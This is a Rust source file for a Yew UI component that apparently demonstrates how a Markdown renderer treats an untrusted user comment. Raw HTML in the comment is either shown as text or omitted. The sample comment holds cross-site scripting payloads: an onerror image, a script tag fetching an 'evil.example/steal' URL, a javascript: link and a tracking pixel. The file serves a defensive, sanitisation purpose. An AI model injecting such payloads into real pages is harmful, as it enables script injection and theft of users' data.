use yew::prelude::*;
use yewi::prelude::*;

const COMMENT: &str = r#"Thanks, that fixed it! <img src=x onerror="alert(1)">

<script>fetch("https://evil.example/steal")</script>

See [my notes](javascript:alert(1)) and this ![tracking pixel](https://evil.example/pixel.gif).
"#;

#[function_component]
pub fn Example() -> Html {
    html! {
        <Grid min="18rem">
            <Card title="Shown as text" level=3>
                <Markdown source={COMMENT} images=false />
            </Card>
            <Card title="Omitted" level=3>
                <Markdown source={COMMENT} images=false html={MarkdownHtml::Omit} />
            </Card>
        </Grid>
    }
}
